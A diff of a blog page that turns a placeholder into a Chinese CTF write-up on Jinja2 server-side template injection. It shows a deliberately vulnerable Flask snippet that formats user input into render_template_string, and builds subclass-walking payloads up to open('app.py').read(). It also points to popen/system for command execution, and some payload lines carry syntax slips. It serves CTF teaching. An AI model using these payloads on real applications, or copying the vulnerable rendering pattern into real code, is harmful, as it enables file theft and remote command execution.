@@ -6,7 +6,7 @@
   <meta charset="utf-8">
   <!-- SEO相关 -->
   
-  <link rel="canonical" href="http://example.com/more/"/>
+  <link rel="canonical" href="http://example.com/2024/04/24/ssti原理即题目/"/>
   <!-- 渲染优化 -->
     <meta http-equiv='x-dns-prefetch-control' content='on' />
       <link rel='dns-prefetch' href='https://unpkg.com'>
@@ -33,17 +33,19 @@
 
   <!-- feed -->
   <!-- 页面元数据 -->
-  <title>more - Jijoy的blog</title>
+  <title>ssti原理即题目 - Jijoy的blog</title>
   <meta name="keywords" content="null">
   <meta desc name="description" content="Jijoy的blog - Jijoy - Jijoy的blog">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="more">
-<meta property="og:url" content="http://example.com/more/index.html">
+  
+<meta property="og:type" content="article">
+<meta property="og:title" content="ssti原理即题目">
+<meta property="og:url" content="http://example.com/2024/04/24/ssti%E5%8E%9F%E7%90%86%E5%8D%B3%E9%A2%98%E7%9B%AE/index.html">
 <meta property="og:site_name" content="Jijoy的blog">
+<meta property="og:description" content="ssti漏洞及其原理分析ssti（模板注入）ssti漏洞其根本原因是其实是其渲染模板语法和编写语法之间存在差异，而最常见的就是python中的jinja2模板引擎 这里就是中海的一道很简单的ssti的题目，这里就利用这个来回顾一下整个ssti的漏洞成因和利用 这里先引用一下一段很简单的flask环境代码，而flask的模板引擎正好就是我们jinja2模板引擎 1234567891011121314">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-<meta property="article:published_time" content="2023-10-08T11:14:24.000Z">
-<meta property="article:modified_time" content="2023-10-08T11:14:24.601Z">
+<meta property="article:published_time" content="2024-04-24T13:19:19.000Z">
+<meta property="article:modified_time" content="2024-04-25T04:34:38.547Z">
 <meta property="article:author" content="Jijoy">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
@@ -2289,7 +2291,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
     
       <!-- see: /layout/_partial/scripts/_ctrl/coverCtrl.ejs -->
-      <div id="none" class='cover-wrapper page search' style="display: none;">
+      <div id="none" class='cover-wrapper post search' style="display: none;">
         
   <div class='cover-bg lazyload placeholder' data-bg="https://img-baofun.zhhainiao.com/pcwallpaper_ugc/static/10dc1ed9054de29b4eed4a6d6711cf06.jpg?x-oss-process=image%2fresize%2cm_lfit%2cw_1920%2ch_1080"></div>
 
@@ -2353,8 +2355,8 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
         <div class="body-wrapper">
           
 <div id="l_main" class=''>
-  <article itemscope itemtype="http://schema.org/Article" class="article post white-box reveal md shadow floatable blur article-type-page" id="page" itemscope itemprop="blogPost">
-  <link itemprop="mainEntityOfPage" href="http://example.com/more/index.html">
+  <article itemscope itemtype="http://schema.org/Article" class="article post white-box reveal md shadow floatable blur article-type-post" id="post" itemscope itemprop="blogPost">
+  <link itemprop="mainEntityOfPage" href="http://example.com/2024/04/24/ssti原理即题目/">
   <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
     <meta itemprop="name" content="Jijoy的blog">
   </span>
@@ -2375,7 +2377,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
     
       <h1 class="title" itemprop="name headline">
-        more
+        ssti原理即题目
       </h1>
       <div class='new-meta-box'>
         
@@ -2396,10 +2398,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
           
         
           
-            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2023-10-08T19:14:24+08:00">
+            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2024-04-24T21:19:19+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-calendar-alt fa-fw" aria-hidden="true"></i>
-    <p>发布于：Oct 8, 2023</p>
+    <p>发布于：Apr 24, 2024</p>
   </a>
 </div>
 
@@ -2422,9 +2424,91 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   <div id="layoutHelper-page-plugins"></div>
   <div id="post-body" itemprop="articleBody">
-    
+    <h2 id="ssti漏洞及其原理分析"><a href="#ssti漏洞及其原理分析" class="headerlink" title="ssti漏洞及其原理分析"></a>ssti漏洞及其原理分析</h2><h3 id="ssti（模板注入）"><a href="#ssti（模板注入）" class="headerlink" title="ssti（模板注入）"></a>ssti（模板注入）</h3><p>ssti漏洞其根本原因是其实是其渲染模板语法和编写语法之间存在差异，而最常见的就是python中的jinja2模板引擎</p>
+<p>这里就是中海的一道很简单的ssti的题目，这里就利用这个来回顾一下整个ssti的漏洞成因和利用</p>
+<p>这里先引用一下一段很简单的flask环境代码，而flask的模板引擎正好就是我们jinja2模板引擎</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask,request,render_template_string</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def index():</span><br><span class="line">    name = request.args.get(&#x27;name&#x27;)</span><br><span class="line">    template = &#x27;&#x27;&#x27;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;title&gt;SSTI&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line"> &lt;body&gt;</span><br><span class="line">      &lt;h3&gt;Hello, %s !&lt;/h3&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">        &#x27;&#x27;&#x27;% (name)</span><br><span class="line">    return render_template_string(template)</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    app.run(host=&quot;0.0.0.0&quot;, port=5000, debug=True)</span><br></pre></td></tr></table></figure>
+
+<p>这里我们渲染了一段html语言的环境，而由于渲染引擎和编写语言的差异，从而导致了这里存在了可能注入的机会</p>
+<p><img src="/../image/241.png" class="lazyload" data-srcset="/../image/241.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="241"></p>
+<p>而在python中我们可以对name进行随意赋值，当我们对name赋值成执行语句时，就会造成了模板注入漏洞</p>
+<p>理解了漏洞的来由后，我们就需要思考如何利用这个漏洞进行命令执行</p>
+<p>进行命令执行我们无疑就是需要去调用方法，而方法一般定义在类中，这样我们就有了一定的思路，就是我们需要去调用到我们需要的类，从而实现我们对于方法的调用</p>
+<p>那么我们需要的类去哪里找呢，一个很简单的方法就是从父类下所有的子类中去找，那么这里我们就利用沙盒进行测试</p>
+<p><img src="/../image/242.png" class="lazyload" data-srcset="/../image/242.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="242"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;.__class__</span><br></pre></td></tr></table></figure>
+
+<p>这里我们先定义一个字符串，然后去找到字符串的所处的类</p>
+<p><img src="/../image/243.png" class="lazyload" data-srcset="/../image/243.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="243"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;.__class__.__base__</span><br></pre></td></tr></table></figure>
+
+<p>然后我们就去找这个类的父类，一般大部分的子类都存放在这个父类之中</p>
+<p><img src="/../image/244.png" class="lazyload" data-srcset="/../image/244.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="244"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;.__class__.__base__.__subclasses__()</span><br></pre></td></tr></table></figure>
+
+<p>这样我们就通过<code>__subclasses__()</code>去查找父类下的所有类，<code>__subclasses__</code>是一个内置方法，所有这里需要加上（）</p>
+<p>ok，到这里我们就需要知道一下常见的可以利用点，比如<strong>os._wrap_close   warnings.catch_warnings</strong></p>
+<h4 id="warnings-catch-warnings"><a href="#warnings-catch-warnings" class="headerlink" title="warnings.catch_warnings"></a>warnings.catch_warnings</h4><p>一个控制警告信息的库，其一般性都有执行语句可以进行调用</p>
+<h4 id="os-wrap-close"><a href="#os-wrap-close" class="headerlink" title="os._wrap_close"></a>os._wrap_close</h4><p>调用os模块，提供方法系统服务的功能</p>
+<p>由于<code>&#39;&#39;.__class__.__base__.__subclasses__()</code>这里返回的是一个列表，我们需要用过索引去访问，就简单写个遍历脚本就行，这里懒得贴了</p>
+<p>当我们调用到所需要的子类之后，需要对子类进行初始化，创建实例才能进行使用</p>
+<p><img src="/../image/245.png" class="lazyload" data-srcset="/../image/245.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="245"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;.__class__.__base__.__subclasses__()[132].__init__</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/246.png" class="lazyload" data-srcset="/../image/246.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="246"></p>
+<p>这里会返回一个对象，这里我们就利用<code>__globals__</code>把里面所有的变量通过字典表示出来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;.__class__.__base__.__subclasses__()[132].__init__.__globals__</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/247.png" class="lazyload" data-srcset="/../image/247.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="247"></p>
+<p>在这里我们就可调用里面我们所需要的方法，而这里就是需要知道一些命令执行的方法，比如<strong>system  popen</strong>,同时也可以通过开文件的方法来进行<strong>open  file</strong>，这里可以调用的方法就比较多了</p>
+<p>这里对于方法的调用也很简单，就是通过字典的方法进行读取，只要找到字典的键值对即可</p>
+<p><img src="/../image/248.png" class="lazyload" data-srcset="/../image/248.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="248"></p>
+<p>调用后我们就可以利用方法进行命令执行和读取了</p>
+<p>ok然后我们回到这道题目上面来</p>
+<p>给了一个python工具，附件里有他的框架，可以判断出来应该是一道ssti</p>
+<p>前面常规的我就不过多说明</p>
+<p>找一下我们可以利用到的那几个类</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/249.png" class="lazyload" data-srcset="/../image/249.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="249"></p>
+<p>这里就利用**’warnings.catch_warnings**</p>
+<p><img src="/../image/250.png" class="lazyload" data-srcset="/../image/250.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="250"></p>
+<p>找到需要的索引</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[221]</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/521.png" class="lazyload" data-srcset="/../image/521.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="521"></p>
+<p>ok，我们就初始化这个类，创建实例，然后导入到字典里</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[221].__init__.__globals__</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/522.png" class="lazyload" data-srcset="/../image/522.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="522"></p>
+<p>找不到<strong>popen</strong>，这里我们就用文件打开，去看他的配置文件app.py</p>
+<p>找到<strong>open</strong>所在的键值对</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[221].__init__.__globals__.[&#x27;__builtins__&#x27;]</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/523.png" class="lazyload" data-srcset="/../image/523.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="523"></p>
+<p>发现<strong>open</strong>可以直接调用了，我们就直接打开文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[221].__init__.__globals__.[&#x27;__builtins__&#x27;][&#x27;open&#x27;](qpp.py)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/524.png" class="lazyload" data-srcset="/../image/524.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="524"></p>
+<p>发现返回的是字节流，这里我们就用**.read()**读取字节流里面的数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[221].__init__.__globals__.[&#x27;__builtins__&#x27;][&#x27;open&#x27;](qpp.py).read()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/525.png" class="lazyload" data-srcset="/../image/525.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="525"></p>
+
   </div>
   
+  
+    
+    <div class='footer'>
+       <!-- 参考资料、相关资料等 -->
+      
+       <!-- 相关文章 -->
+      
+      <!-- 版权声明组件 -->
+      
+      <!-- 打赏组件 -->
+      
+    </div>
   
   
     
@@ -2434,10 +2518,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateModified" datetime="2023-10-08T19:14:24+08:00">
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2024-04-25T12:34:38+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：Oct 8, 2023</p>
+    <p>更新于：Apr 25, 2024</p>
   </a>
 </div>
 
@@ -2456,7 +2540,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/more/index.html&title=more - Jijoy的blog&summary="
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2024/04/24/ssti%E5%8E%9F%E7%90%86%E5%8D%B3%E9%A2%98%E7%9B%AE/&title=ssti原理即题目 - Jijoy的blog&summary="
           
           >
           
@@ -2468,7 +2552,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/more/index.html&title=more - Jijoy的blog&summary="
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2024/04/24/ssti%E5%8E%9F%E7%90%86%E5%8D%B3%E9%A2%98%E7%9B%AE/&title=ssti原理即题目 - Jijoy的blog&summary="
           
           >
           
@@ -2480,7 +2564,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/more/index.html&title=more - Jijoy的blog&summary="
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2024/04/24/ssti%E5%8E%9F%E7%90%86%E5%8D%B3%E9%A2%98%E7%9B%AE/&title=ssti原理即题目 - Jijoy的blog&summary="
           
           >
           
@@ -2511,6 +2595,18 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
 
   
+    <div class="prev-next">
+      
+      
+        <a class='next' href='/2024/04/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/'>
+          <p class='title'>代码审计<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>[BJDCTF2020]Mark loves cat首页是一个页面，没有什么信息
+用dirmap扫一下目录，发现存在**.git**泄露
+1234567891011121314151617181...</p>
+        </a>
+      
+    </div>
+  
   <!-- Custom Files postEnd begin-->
   
   <!-- Custom Files postEnd end-->
@@ -2522,7 +2618,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   <article class="post white-box shadow floatable blur" id="comments">
     <span hidden>
-      <meta itemprop="discussionUrl" content="/more/index.html#comments">
+      <meta itemprop="discussionUrl" content="/2024/04/24/ssti%E5%8E%9F%E7%90%86%E5%8D%B3%E9%A2%98%E7%9B%AE/index.html#comments">
     </span>
     <p ct><i class='fa-solid fa-comments'></i> 评论</p>
     
@@ -2554,9 +2650,19 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
 
 
-  <div class="">
-    <!-- pjax占位 -->
-  </div>
+  <section class="widget toc-wrapper desktop mobile " id="toc-div" >
+    
+  <header>
+    
+      <i class="fa-solid fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+
+    <div class='content'>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ssti%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="toc-text">ssti漏洞及其原理分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ssti%EF%BC%88%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="toc-text">ssti（模板注入）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#warnings-catch-warnings"><span class="toc-text">warnings.catch_warnings</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#os-wrap-close"><span class="toc-text">os._wrap_close</span></a></li></ol></li></ol></li></ol>
+    </div>
+  </section>
 
   
 
@@ -2618,7 +2724,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <pjax>
 <script>
   window.pdata={}
-  pdata.ispage=false;
+  pdata.ispage=true;
   pdata.commentPath="";
   pdata.commentPlaceholder="";
   pdata.commentConfig={};
@@ -3146,7 +3252,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Jijoy的blog","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"Jijoy","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":""},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Jijoy的blog"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Jijoy的blog","url":"http://example.com/","keywords":null,"description":"","author":{"@type":"Person","name":"Jijoy","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":""},"publisher":{"@type":"Organization","name":"Jijoy的blog","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"more","description":"","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/more/index.html"},"author":{"@type":"Person","name":"Jijoy","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Jijoy的blog","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/more/index.html","wordCount":0,"datePublished":"2023-10-08T11:14:24.000Z","dateModified":"2023-10-08T11:14:24.601Z","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Jijoy的blog","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"Jijoy","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":""},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Jijoy的blog"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2024/04/24/ssti原理即题目/","name":"ssti原理即题目"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Jijoy的blog","url":"http://example.com/","keywords":null,"description":"","author":{"@type":"Person","name":"Jijoy","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":""},"publisher":{"@type":"Organization","name":"Jijoy的blog","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"ssti原理即题目","description":"","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2024/04/24/ssti%E5%8E%9F%E7%90%86%E5%8D%B3%E9%A2%98%E7%9B%AE/"},"author":{"@type":"Person","name":"Jijoy","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Jijoy的blog","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2024/04/24/ssti%E5%8E%9F%E7%90%86%E5%8D%B3%E9%A2%98%E7%9B%AE/","wordCount":0,"datePublished":"2024-04-24T13:19:19.000Z","dateModified":"2024-04-25T04:34:38.547Z","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
